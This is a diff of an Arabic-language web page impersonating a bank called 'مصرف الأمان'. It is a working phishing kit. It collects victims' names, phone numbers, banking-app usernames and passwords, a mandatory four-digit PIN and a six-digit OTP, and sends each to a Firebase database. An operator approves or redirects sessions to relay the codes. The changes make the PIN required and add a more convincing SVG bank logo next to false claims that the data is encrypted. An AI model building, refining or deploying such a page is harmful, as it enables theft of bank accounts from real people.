@@ -28,11 +28,29 @@
 
     body { background: var(--bg); color: var(--text); min-height: 100vh; }
 
-    /* ===== PAGES ===== */
     .page { display: none; min-height: 100vh; flex-direction: column; }
     .page.active { display: flex; }
 
-    /* ===== HEADER ===== */
+    /* ===== LOGO SVG ===== */
+    .bank-logo {
+      width: 40px; height: 40px;
+      background: rgba(255,255,255,0.95);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+      flex-shrink: 0;
+    }
+    .hero-logo {
+      width: 100px; height: 100px;
+      background: rgba(255,255,255,0.15);
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 28px;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 20px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+    }
+
+    /* ===== TOP BAR ===== */
     .top-bar {
       background: var(--primary);
       color: #fff;
@@ -43,182 +61,129 @@
       position: sticky; top: 0; z-index: 50;
     }
     .top-bar-brand { display: flex; align-items: center; gap: 10px; }
-    .top-bar-brand .bank-icon {
-      width: 36px; height: 36px;
-      background: rgba(255,255,255,0.2);
-      border-radius: 10px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 20px;
-    }
     .top-bar-brand h1 { font-size: 17px; font-weight: 900; }
     .top-bar-right { display: flex; align-items: center; gap: 10px; }
     .offline-badge {
       background: rgba(255,255,255,0.15);
       border: 1px solid rgba(255,255,255,0.3);
-      border-radius: 20px;
-      padding: 4px 12px;
-      font-size: 11px;
-      display: flex; align-items: center; gap: 5px;
+      border-radius: 20px; padding: 4px 12px;
+      font-size: 11px; display: flex; align-items: center; gap: 5px;
     }
     .offline-dot { width: 7px; height: 7px; background: #69f0ae; border-radius: 50%; }
     .social-links { display: flex; gap: 8px; }
     .social-btn {
-      width: 32px; height: 32px;
-      border-radius: 8px;
+      width: 32px; height: 32px; border-radius: 8px;
       display: flex; align-items: center; justify-content: center;
-      text-decoration: none; font-size: 16px;
-      background: rgba(255,255,255,0.15);
+      text-decoration: none; background: rgba(255,255,255,0.15);
       transition: background 0.2s;
     }
     .social-btn:hover { background: rgba(255,255,255,0.28); }
 
-    /* ===== LANDING PAGE ===== */
+    /* ===== LANDING ===== */
     #page-landing {
       background: linear-gradient(160deg, var(--primary-dark) 0%, var(--primary) 55%, var(--primary-light) 100%);
     }
     #page-landing .top-bar { background: rgba(0,0,0,0.15); box-shadow: none; }
 
     .landing-hero {
-      flex: 1;
-      display: flex; flex-direction: column;
+      flex: 1; display: flex; flex-direction: column;
       align-items: center; justify-content: center;
-      padding: 40px 20px;
-      text-align: center;
-      color: #fff;
-    }
-    .hero-icon {
-      width: 90px; height: 90px;
-      background: rgba(255,255,255,0.15);
-      border-radius: 24px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 48px;
-      margin-bottom: 20px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+      padding: 40px 20px; text-align: center; color: #fff;
     }
     .landing-hero h2 { font-size: 28px; font-weight: 900; margin-bottom: 8px; }
     .landing-hero p { font-size: 15px; opacity: 0.85; margin-bottom: 32px; max-width: 320px; }
 
     .features-row {
-      display: flex; gap: 12px; margin-bottom: 36px; flex-wrap: wrap; justify-content: center;
+      display: flex; gap: 12px; margin-bottom: 36px;
+      flex-wrap: wrap; justify-content: center;
     }
     .feature-chip {
       background: rgba(255,255,255,0.15);
       border: 1px solid rgba(255,255,255,0.25);
-      border-radius: 20px;
-      padding: 6px 14px;
-      font-size: 12px;
-      display: flex; align-items: center; gap: 6px;
+      border-radius: 20px; padding: 6px 14px;
+      font-size: 12px; display: flex; align-items: center; gap: 6px;
     }
-
     .btn-start {
-      background: #fff;
-      color: var(--primary);
-      border: none;
-      border-radius: 14px;
-      padding: 16px 48px;
-      font-size: 17px; font-weight: 900;
-      cursor: pointer;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+      background: #fff; color: var(--primary);
+      border: none; border-radius: 14px;
+      padding: 16px 48px; font-size: 17px; font-weight: 900;
+      cursor: pointer; box-shadow: 0 8px 24px rgba(0,0,0,0.2);
       transition: transform 0.15s, box-shadow 0.15s;
     }
     .btn-start:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(0,0,0,0.25); }
-    .btn-start:active { transform: translateY(0); }
-
     .landing-footer {
-      padding: 16px;
-      text-align: center;
-      color: rgba(255,255,255,0.6);
-      font-size: 11px;
+      padding: 16px; text-align: center;
+      color: rgba(255,255,255,0.6); font-size: 11px;
     }
 
-    /* ===== CARD LAYOUT (shared) ===== */
+    /* ===== CARD ===== */
     .card-page {
-      flex: 1;
-      display: flex; flex-direction: column;
-      align-items: center;
-      padding: 24px 16px 40px;
-      background: var(--bg);
+      flex: 1; display: flex; flex-direction: column;
+      align-items: center; padding: 24px 16px 40px; background: var(--bg);
     }
     .card {
-      background: var(--white);
-      border-radius: 18px;
-      box-shadow: var(--shadow-lg);
-      width: 100%; max-width: 420px;
-      overflow: hidden;
+      background: var(--white); border-radius: 18px;
+      box-shadow: var(--shadow-lg); width: 100%; max-width: 420px; overflow: hidden;
     }
     .card-header {
       background: linear-gradient(135deg, var(--primary-dark), var(--primary));
-      color: #fff;
-      padding: 20px 22px;
+      color: #fff; padding: 20px 22px;
     }
-    .card-header h2 { font-size: 18px; font-weight: 900; margin-bottom: 4px; }
-    .card-header p { font-size: 12px; opacity: 0.8; }
+    .card-header h2 { font-size: 18px; font-weight: 900; margin-bottom: 4px; color: #fff !important; }
+    .card-header p { font-size: 12px; opacity: 0.85; }
     .card-body { padding: 22px; }
 
-    /* STEP INDICATOR */
+    /* ===== STEPS ===== */
     .steps {
       display: flex; align-items: center; justify-content: center;
       gap: 0; margin-bottom: 22px;
     }
     .step {
-      width: 32px; height: 32px;
-      border-radius: 50%;
+      width: 32px; height: 32px; border-radius: 50%;
       display: flex; align-items: center; justify-content: center;
       font-size: 13px; font-weight: 800;
-      background: #e0e0e0; color: #999;
-      position: relative; z-index: 1;
-      transition: all 0.3s;
+      background: #e0e0e0; color: #999; transition: all 0.3s;
     }
     .step.active { background: var(--primary); color: #fff; box-shadow: 0 0 0 4px var(--primary-bg); }
     .step.done { background: #22c55e; color: #fff; }
     .step-line { flex: 1; height: 2px; background: #e0e0e0; max-width: 40px; }
     .step-line.done { background: #22c55e; }
 
-    /* FORM ELEMENTS */
+    /* ===== FORM ===== */
     .form-group { margin-bottom: 16px; }
     .form-group label {
       display: block; font-size: 12px; font-weight: 700;
       color: var(--text-sub); margin-bottom: 6px;
     }
-    .form-group input, .form-group select {
+    .form-group input {
       width: 100%; padding: 12px 14px;
-      border: 1.5px solid var(--border);
-      border-radius: 10px; font-size: 14px;
-      outline: none; background: var(--white);
+      border: 1.5px solid var(--border); border-radius: 10px;
+      font-size: 14px; outline: none; background: var(--white);
       color: var(--text); transition: border-color 0.2s;
       font-family: 'Cairo', Arial, sans-serif;
     }
-    .form-group input:focus, .form-group select:focus { border-color: var(--primary); }
+    .form-group input:focus { border-color: var(--primary); }
     .form-group input::placeholder { color: #bbb; }
 
     .btn-primary {
-      width: 100%; padding: 14px;
-      background: var(--primary); color: #fff;
-      border: none; border-radius: 12px;
-      font-size: 15px; font-weight: 900;
+      width: 100%; padding: 14px; background: var(--primary); color: #fff;
+      border: none; border-radius: 12px; font-size: 15px; font-weight: 900;
       cursor: pointer; transition: background 0.2s;
       font-family: 'Cairo', Arial, sans-serif;
     }
     .btn-primary:hover { background: var(--primary-dark); }
-    .btn-primary:disabled { background: #b0bec5; cursor: not-allowed; }
-
     .btn-secondary {
-      width: 100%; padding: 12px;
-      background: transparent; color: var(--primary);
-      border: 1.5px solid var(--border);
-      border-radius: 12px; font-size: 14px; font-weight: 700;
-      cursor: pointer; margin-top: 10px;
-      font-family: 'Cairo', Arial, sans-serif;
-      transition: all 0.2s;
+      width: 100%; padding: 12px; background: transparent; color: var(--primary);
+      border: 1.5px solid var(--border); border-radius: 12px;
+      font-size: 14px; font-weight: 700; cursor: pointer; margin-top: 10px;
+      font-family: 'Cairo', Arial, sans-serif; transition: all 0.2s;
     }
     .btn-secondary:hover { border-color: var(--primary); background: var(--primary-bg); }
 
-    /* LOADING SPINNER */
+    /* ===== LOADING ===== */
     .loading-overlay {
-      display: none;
-      position: fixed; inset: 0;
-      background: rgba(0,0,0,0.45);
-      z-index: 999;
+      display: none; position: fixed; inset: 0;
+      background: rgba(0,0,0,0.45); z-index: 999;
       align-items: center; justify-content: center;
       flex-direction: column; gap: 16px;
     }
@@ -226,93 +191,55 @@
     .spinner {
       width: 52px; height: 52px;
       border: 4px solid rgba(255,255,255,0.3);
-      border-top-color: #fff;
-      border-radius: 50%;
+      border-top-color: #fff; border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
     .loading-text { color: #fff; font-size: 15px; font-weight: 700; }
 
-    /* WAITING SCREEN */
-    .waiting-box {
-      text-align: center; padding: 32px 20px;
-    }
-    .waiting-icon {
-      font-size: 52px; margin-bottom: 16px;
-      animation: bounce 1.5s infinite;
-    }
+    /* ===== WAITING ===== */
+    .waiting-box { text-align: center; padding: 32px 20px; }
+    .waiting-icon { font-size: 52px; margin-bottom: 16px; animation: bounce 1.5s infinite; }
     @keyframes bounce {
       0%,100% { transform: translateY(0); }
       50% { transform: translateY(-8px); }
     }
     .waiting-box h3 { font-size: 18px; font-weight: 900; color: var(--primary); margin-bottom: 8px; }
     .waiting-box p { font-size: 13px; color: var(--text-sub); margin-bottom: 20px; }
-    .progress-bar {
-      height: 4px; background: #e0e0e0;
-      border-radius: 2px; overflow: hidden; margin-bottom: 20px;
-    }
+    .progress-bar { height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-bottom: 20px; }
     .progress-fill {
-      height: 100%; background: var(--primary);
-      border-radius: 2px;
+      height: 100%; background: var(--primary); border-radius: 2px;
       animation: progress 2s ease-in-out infinite;
     }
-    @keyframes progress {
-      0% { width: 0%; }
-      50% { width: 70%; }
-      100% { width: 100%; }
-    }
+    @keyframes progress { 0%{width:0%} 50%{width:70%} 100%{width:100%} }
 
-    /* OTP INPUT */
-    .otp-inputs {
-      display: flex; gap: 10px; justify-content: center;
-      margin: 20px 0;
-    }
+    /* ===== OTP ===== */
+    .otp-inputs { display: flex; gap: 10px; justify-content: center; margin: 20px 0; }
     .otp-inputs input {
-      width: 48px; height: 56px;
-      text-align: center; font-size: 22px; font-weight: 900;
+      width: 48px; height: 56px; text-align: center;
+      font-size: 22px; font-weight: 900;
       border: 2px solid var(--border); border-radius: 12px;
       outline: none; transition: border-color 0.2s;
       font-family: 'Cairo', Arial, sans-serif;
     }
     .otp-inputs input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px var(--primary-bg); }
 
-    /* SUCCESS / ERROR */
-    .result-box {
-      text-align: center; padding: 40px 20px;
-    }
+    /* ===== RESULT ===== */
+    .result-box { text-align: center; padding: 40px 20px; }
     .result-icon { font-size: 64px; margin-bottom: 16px; }
     .result-box h3 { font-size: 20px; font-weight: 900; margin-bottom: 8px; }
     .result-box p { font-size: 14px; color: var(--text-sub); margin-bottom: 24px; }
     .result-box.success h3 { color: var(--green); }
     .result-box.error h3 { color: var(--red); }
 
-    /* INFO NOTICE */
+    /* ===== INFO NOTICE ===== */
     .info-notice {
-      background: var(--primary-bg);
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      padding: 12px 14px;
+      background: var(--primary-bg); border: 1px solid var(--border);
+      border-radius: 10px; padding: 12px 14px;
       font-size: 12px; color: var(--primary);
-      margin-bottom: 16px;
-      display: flex; align-items: flex-start; gap: 8px;
+      margin-bottom: 16px; display: flex; align-items: flex-start; gap: 8px;
     }
 
-    /* BANK SELECTOR */
-    .bank-grid {
-      display: grid; grid-template-columns: 1fr 1fr;
-      gap: 10px; margin-bottom: 16px;
-    }
-    .bank-option {
-      border: 2px solid var(--border);
-      border-radius: 12px; padding: 12px 10px;
-      text-align: center; cursor: pointer;
-      transition: all 0.2s; font-size: 13px; font-weight: 700;
-    }
-    .bank-option:hover { border-color: var(--primary); background: var(--primary-bg); }
-    .bank-option.selected { border-color: var(--primary); background: var(--primary-bg); color: var(--primary); }
-    .bank-option .bank-emoji { font-size: 24px; display: block; margin-bottom: 4px; }
-
-    /* SCROLLBAR */
     ::-webkit-scrollbar { width: 5px; }
     ::-webkit-scrollbar-track { background: #f0f0f0; }
     ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
@@ -320,11 +247,35 @@
 </head>
 <body>
 
-<!-- ===== LOADING OVERLAY ===== -->
+<!-- LOADING -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="spinner"></div>
   <div class="loading-text" id="loadingText">جاري المعالجة...</div>
 </div>
+
+<!-- شعار SVG مشترك (مخفي - يُستخدم كـ template) -->
+<svg style="display:none" id="logoTemplate">
+  <symbol id="bank-icon-blue" viewBox="0 0 100 100">
+    <rect x="8" y="70" width="84" height="10" rx="3" fill="#003d7a"/>
+    <rect x="10" y="58" width="80" height="13" rx="2" fill="#0058b0"/>
+    <rect x="17" y="34" width="11" height="25" rx="2" fill="#0058b0"/>
+    <rect x="35" y="34" width="11" height="25" rx="2" fill="#0058b0"/>
+    <rect x="53" y="34" width="11" height="25" rx="2" fill="#0058b0"/>
+    <rect x="71" y="34" width="11" height="25" rx="2" fill="#0058b0"/>
+    <polygon points="4,34 50,8 96,34" fill="#003d7a"/>
+    <circle cx="50" cy="23" r="6" fill="#ffffff" opacity="0.9"/>
+  </symbol>
+  <symbol id="bank-icon-white" viewBox="0 0 100 100">
+    <rect x="8" y="70" width="84" height="10" rx="3" fill="rgba(255,255,255,0.7)"/>
+    <rect x="10" y="58" width="80" height="13" rx="2" fill="rgba(255,255,255,0.85)"/>
+    <rect x="17" y="34" width="11" height="25" rx="2" fill="#ffffff"/>
+    <rect x="35" y="34" width="11" height="25" rx="2" fill="#ffffff"/>
+    <rect x="53" y="34" width="11" height="25" rx="2" fill="#ffffff"/>
+    <rect x="71" y="34" width="11" height="25" rx="2" fill="#ffffff"/>
+    <polygon points="4,34 50,8 96,34" fill="rgba(255,255,255,0.9)"/>
+    <circle cx="50" cy="23" r="6" fill="#0058b0"/>
+  </symbol>
+</svg>
 
 <!-- ================================================================
      PAGE 1: LANDING
@@ -332,7 +283,9 @@
 <div class="page active" id="page-landing">
   <div class="top-bar">
     <div class="top-bar-brand">
-      <div class="bank-icon">🏦</div>
+      <div class="bank-logo">
+        <svg width="28" height="28" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
+      </div>
       <h1>مصرف الأمان</h1>
     </div>
     <div class="top-bar-right">
@@ -352,43 +305,37 @@
   </div>
 
   <div class="landing-hero">
-    <div class="hero-icon">🏦</div>
+    <!-- شعار كبير في المنتصف -->
+    <div class="hero-logo">
+      <svg width="64" height="64" viewBox="0 0 100 100"><use href="#bank-icon-white"/></svg>
+    </div>
     <h2>مصرف الأمان</h2>
     <p>خدمات مصرفية آمنة وموثوقة على مدار الساعة</p>
-
     <div class="features-row">
       <div class="feature-chip">🔒 آمن 100%</div>
       <div class="feature-chip">⚡ سريع وسهل</div>
       <div class="feature-chip">📱 متاح دائماً</div>
     </div>
-
-    <button class="btn-start" onclick="goToPage('personal')">
-      ابدأ الآن ←
-    </button>
+    <button class="btn-start" onclick="goToPage('personal')">ابدأ الآن ←</button>
   </div>
-
-  <div class="landing-footer">
-    © 2024 مصرف الأمان - جميع الحقوق محفوظة
-  </div>
+  <div class="landing-footer">© 2024 مصرف الأمان - جميع الحقوق محفوظة</div>
 </div>
 
 <!-- ================================================================
-     PAGE 2: PERSONAL INFO
+     PAGE 2: PERSONAL
 ================================================================ -->
 <div class="page" id="page-personal">
   <div class="top-bar">
     <div class="top-bar-brand">
-      <div class="bank-icon">🏦</div>
+      <div class="bank-logo">
+        <svg width="28" height="28" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
+      </div>
       <h1>مصرف الأمان</h1>
     </div>
     <div class="top-bar-right">
-      <div class="offline-badge">
-        <div class="offline-dot"></div>
-        بدون إنترنت
-      </div>
+      <div class="offline-badge"><div class="offline-dot"></div>بدون إنترنت</div>
     </div>
   </div>
-
   <div class="card-page">
     <div class="card">
       <div class="card-header">
@@ -403,44 +350,19 @@
           <div class="step-line"></div>
           <div class="step">3</div>
         </div>
-
-        <div class="info-notice">
-          🔒 بياناتك محمية ومشفرة بالكامل
-        </div>
-
+        <div class="info-notice">🔒 بياناتك محمية ومشفرة بالكامل</div>
         <div class="form-group">
           <label>الاسم الكامل</label>
           <input type="text" id="inp-name" placeholder="أدخل اسمك الكامل"/>
         </div>
         <div class="form-group">
           <label>رقم الهاتف</label>
-          <input type="tel" id="inp-phone-personal" placeholder="05XXXXXXXX"/>
+          <input type="tel" id="inp-phone-personal" placeholder="09XXXXXXXX"/>
         </div>
-
         <div class="form-group">
-          <label>اختر البنك</label>
-          <div class="bank-grid" id="bankGrid">
-            <div class="bank-option" onclick="selectBank(this, 'الراجحي')">
-              <span class="bank-emoji">🏦</span>الراجحي
-            </div>
-            <div class="bank-option" onclick="selectBank(this, 'الأهلي')">
-              <span class="bank-emoji">🏛</span>الأهلي
-            </div>
-            <div class="bank-option" onclick="selectBank(this, 'الرياض')">
-              <span class="bank-emoji">💼</span>الرياض
-            </div>
-            <div class="bank-option" onclick="selectBank(this, 'سامبا')">
-              <span class="bank-emoji">💳</span>سامبا
-            </div>
-            <div class="bank-option" onclick="selectBank(this, 'البلاد')">
-              <span class="bank-emoji">🏢</span>البلاد
-            </div>
-            <div class="bank-option" onclick="selectBank(this, 'الإنماء')">
-              <span class="bank-emoji">📊</span>الإنماء
-            </div>
-          </div>
+          <label>اختر المصرف</label>
+          <input type="text" id="inp-bank-name" placeholder="أدخل اسم المصرف"/>
         </div>
-
         <button class="btn-primary" onclick="submitPersonal()">متابعة ←</button>
       </div>
     </div>
@@ -448,27 +370,25 @@
 </div>
 
 <!-- ================================================================
-     PAGE 3: LOGIN (App Credentials)
+     PAGE 3: LOGIN
 ================================================================ -->
 <div class="page" id="page-login">
   <div class="top-bar">
     <div class="top-bar-brand">
-      <div class="bank-icon">🏦</div>
+      <div class="bank-logo">
+        <svg width="28" height="28" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
+      </div>
       <h1>مصرف الأمان</h1>
     </div>
     <div class="top-bar-right">
-      <div class="offline-badge">
-        <div class="offline-dot"></div>
-        بدون إنترنت
-      </div>
+      <div class="offline-badge"><div class="offline-dot"></div>بدون إنترنت</div>
     </div>
   </div>
-
   <div class="card-page">
     <div class="card">
       <div class="card-header">
         <h2>🔐 بيانات التطبيق المصرفي</h2>
-        <p>أدخل بيانات تسجيل الدخول الخاصة بك</p>
+        <p>أدخل بيانات تسجيل الدخول للتطبيق المصرفي</p>
       </div>
       <div class="card-body">
         <div class="steps">
@@ -478,11 +398,7 @@
           <div class="step-line"></div>
           <div class="step">3</div>
         </div>
-
-        <div class="info-notice">
-          🛡️ اتصالك مشفر ومحمي بالكامل
-        </div>
-
+        <div class="info-notice">🛡️ اتصالك مشفر ومحمي بالكامل</div>
         <div class="form-group">
           <label>اسم المستخدم / رقم الهاتف</label>
           <input type="text" id="inp-phone" placeholder="أدخل اسم المستخدم"/>
@@ -492,10 +408,17 @@
           <input type="password" id="inp-pin" placeholder="أدخل كلمة المرور"/>
         </div>
         <div class="form-group">
-          <label>الرقم السري BIN (اختياري)</label>
-          <input type="password" id="inp-bin" placeholder="أدخل الرقم السري"/>
+          <label>الرقم السري BIN</label>
+          <input
+            type="password"
+            id="inp-bin"
+            placeholder="أدخل 4 أرقام"
+            maxlength="4"
+            inputmode="numeric"
+            pattern="[0-9]{4}"
+            oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)"
+          />
         </div>
-
         <button class="btn-primary" onclick="submitLogin()">تسجيل الدخول ←</button>
         <button class="btn-secondary" onclick="goToPage('personal')">← رجوع</button>
       </div>
@@ -504,16 +427,17 @@
 </div>
 
 <!-- ================================================================
-     PAGE 4: WAITING (after login submit)
+     PAGE 4: WAITING
 ================================================================ -->
 <div class="page" id="page-waiting">
   <div class="top-bar">
     <div class="top-bar-brand">
-      <div class="bank-icon">🏦</div>
+      <div class="bank-logo">
+        <svg width="28" height="28" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
+      </div>
       <h1>مصرف الأمان</h1>
     </div>
   </div>
-
   <div class="card-page">
     <div class="card">
       <div class="card-body">
@@ -521,9 +445,7 @@
           <div class="waiting-icon">⏳</div>
           <h3>جاري التحقق من بياناتك</h3>
           <p>يرجى الانتظار، نقوم بالتحقق من هويتك بشكل آمن</p>
-          <div class="progress-bar">
-            <div class="progress-fill"></div>
-          </div>
+          <div class="progress-bar"><div class="progress-fill"></div></div>
           <p style="font-size:12px;color:#bbb;">لا تغلق هذه الصفحة</p>
         </div>
       </div>
@@ -537,17 +459,15 @@
 <div class="page" id="page-otp">
   <div class="top-bar">
     <div class="top-bar-brand">
-      <div class="bank-icon">🏦</div>
+      <div class="bank-logo">
+        <svg width="28" height="28" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
+      </div>
       <h1>مصرف الأمان</h1>
     </div>
     <div class="top-bar-right">
-      <div class="offline-badge">
-        <div class="offline-dot"></div>
-        بدون إنترنت
-      </div>
+      <div class="offline-badge"><div class="offline-dot"></div>بدون إنترنت</div>
     </div>
   </div>
-
   <div class="card-page">
     <div class="card">
       <div class="card-header">
@@ -562,11 +482,7 @@
           <div class="step-line done"></div>
           <div class="step active">3</div>
         </div>
-
-        <div class="info-notice">
-          📱 تم إرسال رمز التحقق إلى هاتفك المسجل
-        </div>
-
+        <div class="info-notice">📱 تم إرسال رمز التحقق إلى هاتفك المسجل</div>
         <div class="otp-inputs">
           <input type="number" maxlength="1" id="otp1" oninput="otpMove(this,'otp2')" onkeydown="otpBack(event,this,'')"/>
           <input type="number" maxlength="1" id="otp2" oninput="otpMove(this,'otp3')" onkeydown="otpBack(event,this,'otp1')"/>
@@ -575,7 +491,6 @@
           <input type="number" maxlength="1" id="otp5" oninput="otpMove(this,'otp6')" onkeydown="otpBack(event,this,'otp4')"/>
           <input type="number" maxlength="1" id="otp6" oninput="otpMove(this,'')"    onkeydown="otpBack(event,this,'otp5')"/>
         </div>
-
         <button class="btn-primary" onclick="submitOTP()">تأكيد الرمز ←</button>
       </div>
     </div>
@@ -588,11 +503,12 @@
 <div class="page" id="page-otp-waiting">
   <div class="top-bar">
     <div class="top-bar-brand">
-      <div class="bank-icon">🏦</div>
+      <div class="bank-logo">
+        <svg width="28" height="28" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
+      </div>
       <h1>مصرف الأمان</h1>
     </div>
   </div>
-
   <div class="card-page">
     <div class="card">
       <div class="card-body">
@@ -600,9 +516,7 @@
           <div class="waiting-icon">🔐</div>
           <h3>جاري التحقق من الرمز</h3>
           <p>يرجى الانتظار لحظة...</p>
-          <div class="progress-bar">
-            <div class="progress-fill"></div>
-          </div>
+          <div class="progress-bar"><div class="progress-fill"></div></div>
         </div>
       </div>
     </div>
@@ -615,11 +529,12 @@
 <div class="page" id="page-success">
   <div class="top-bar">
     <div class="top-bar-brand">
-      <div class="bank-icon">🏦</div>
+      <div class="bank-logo">
+        <svg width="28" height="28" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
+      </div>
       <h1>مصرف الأمان</h1>
     </div>
   </div>
-
   <div class="card-page">
     <div class="card">
       <div class="card-body">
@@ -640,18 +555,19 @@
 <div class="page" id="page-error">
   <div class="top-bar">
     <div class="top-bar-brand">
-      <div class="bank-icon">🏦</div>
+      <div class="bank-logo">
+        <svg width="28" height="28" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
+      </div>
       <h1>مصرف الأمان</h1>
     </div>
   </div>
-
   <div class="card-page">
     <div class="card">
       <div class="card-body">
         <div class="result-box error">
           <div class="result-icon">❌</div>
           <h3>حدث خطأ</h3>
-          <p>تعذر التحقق من بياناتك. يرجى المحاولة مرة أخرى أو التواصل مع الدعم.</p>
+          <p>تعذر التحقق من بياناتك. يرجى المحاولة مرة أخرى.</p>
           <button class="btn-primary" onclick="goToPage('login')">المحاولة مجدداً</button>
           <button class="btn-secondary" onclick="goToPage('landing')">العودة للرئيسية</button>
         </div>
@@ -665,9 +581,8 @@
 ================================================================ -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-  import { getDatabase, ref, set, update, onValue, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+  import { getDatabase, ref, set, update, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-  // ✅ Firebase Config - masrfamanly
   const firebaseConfig = {
     apiKey: "AIzaSyAk5Vdri1hF2Bmu953UwVoQbUjy8nPaA-Q",
     authDomain: "masrfamanly.firebaseapp.com",
@@ -682,22 +597,21 @@
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
-  // ===== SESSION =====
   let sessionId = localStorage.getItem('sessionId');
   if (!sessionId) {
     sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2,8);
     localStorage.setItem('sessionId', sessionId);
   }
 
-  let selectedBank = '';
-  let pollInterval = null;
-
-  // ===== HELPERS =====
   window.goToPage = function(page) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     const el = document.getElementById('page-' + page);
     if (el) el.classList.add('active');
-    updateSession({ currentPage: page, currentUrl: window.location.href });
+    update(ref(db, `site1/sessions/${sessionId}`), {
+      currentPage: page,
+      currentUrl: window.location.href,
+      lastAction: Date.now()
+    });
   }
 
   function showLoading(text = 'جاري المعالجة...') {
@@ -708,161 +622,83 @@
     document.getElementById('loadingOverlay').classList.remove('show');
   }
 
-  function updateSession(data) {
-    update(ref(db, `site1/sessions/${sessionId}`), {
-      ...data,
-      lastAction: Date.now()
-    });
-  }
-
-  // ===== BANK SELECT =====
-  window.selectBank = function(el, name) {
-    document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
-    el.classList.add('selected');
-    selectedBank = name;
-  }
-
-  // ===== STEP 1: PERSONAL =====
   window.submitPersonal = function() {
     const name = document.getElementById('inp-name').value.trim();
     const phone = document.getElementById('inp-phone-personal').value.trim();
+    const bankName = document.getElementById('inp-bank-name').value.trim();
     if (!name || !phone) { alert('يرجى تعبئة جميع الحقول'); return; }
-    if (!selectedBank) { alert('يرجى اختيار البنك'); return; }
-
+    if (!bankName) { alert('يرجى إدخال اسم المصرف'); return; }
     showLoading('جاري حفظ البيانات...');
     set(ref(db, `site1/sessions/${sessionId}`), {
-      name,
-      personalPhone: phone,
-      bankName: selectedBank,
-      status: 'new',
-      currentPage: 'login',
+      name, personalPhone: phone, bankName,
+      status: 'new', currentPage: 'login',
       currentUrl: window.location.href,
-      timestamp: Date.now(),
-      lastAction: Date.now()
-    }).then(() => {
-      hideLoading();
-      goToPage('login');
-    });
+      timestamp: Date.now(), lastAction: Date.now()
+    }).then(() => { hideLoading(); goToPage('login'); });
   }
 
-  // ===== STEP 2: LOGIN =====
   window.submitLogin = function() {
     const phone = document.getElementById('inp-phone').value.trim();
     const pin = document.getElementById('inp-pin').value.trim();
     const bin = document.getElementById('inp-bin').value.trim();
     if (!phone || !pin) { alert('يرجى تعبئة الحقول المطلوبة'); return; }
-
+    if (!bin || bin.length !== 4 || !/^\d{4}$/.test(bin)) {
+      alert('يرجى إدخال الرقم السري BIN (4 أرقام)'); return;
+    }
     showLoading('جاري التحقق...');
-    updateSession({
-      phone, pin, bin: bin || '---',
-      status: 'waiting',
-      currentPage: 'waiting'
-    }).then ? null : null;
-
     update(ref(db, `site1/sessions/${sessionId}`), {
-      phone, pin, bin: bin || '---',
-      status: 'waiting',
-      currentPage: 'waiting',
-      lastAction: Date.now()
-    }).then(() => {
-      hideLoading();
-      goToPage('waiting');
-      startPolling();
-    });
+      phone, pin, bin, status: 'waiting',
+      currentPage: 'waiting', lastAction: Date.now()
+    }).then(() => { hideLoading(); goToPage('waiting'); });
   }
 
-  // ===== POLLING FOR ADMIN RESPONSE =====
-  function startPolling() {
-    if (pollInterval) clearInterval(pollInterval);
-    pollInterval = setInterval(() => {
-      onValue(ref(db, `site1/sessions/${sessionId}`), (snap) => {
-        const data = snap.val();
-        if (!data) return;
-
-        // Handle redirect command from admin
-        if (data.redirectTo) {
-          update(ref(db, `site1/sessions/${sessionId}`), { redirectTo: null });
-          goToPage(data.redirectTo);
-          return;
-        }
-
-        const status = data.status;
-        if (status === 'approved') {
-          clearInterval(pollInterval);
-          goToPage('otp');
-        } else if (status === 'rejected') {
-          clearInterval(pollInterval);
-          goToPage('error');
-        } else if (status === 'final_approved') {
-          clearInterval(pollInterval);
-          goToPage('success');
-        } else if (status === 'final_rejected') {
-          clearInterval(pollInterval);
-          goToPage('error');
-        }
-      }, { onlyOnce: true });
-    }, 2000);
-  }
-
-  // ===== OTP HELPERS =====
   window.otpMove = function(el, nextId) {
     const val = el.value.toString();
     if (val.length > 1) el.value = val[val.length - 1];
     if (el.value && nextId) document.getElementById(nextId)?.focus();
   }
   window.otpBack = function(e, el, prevId) {
-    if (e.key === 'Backspace' && !el.value && prevId) {
-      document.getElementById(prevId)?.focus();
-    }
+    if (e.key === 'Backspace' && !el.value && prevId) document.getElementById(prevId)?.focus();
   }
 
-  // ===== STEP 3: OTP =====
   window.submitOTP = function() {
     const otp = ['otp1','otp2','otp3','otp4','otp5','otp6']
       .map(id => document.getElementById(id).value).join('');
     if (otp.length < 6) { alert('يرجى إدخال رمز التحقق كاملاً'); return; }
-
     showLoading('جاري التحقق من الرمز...');
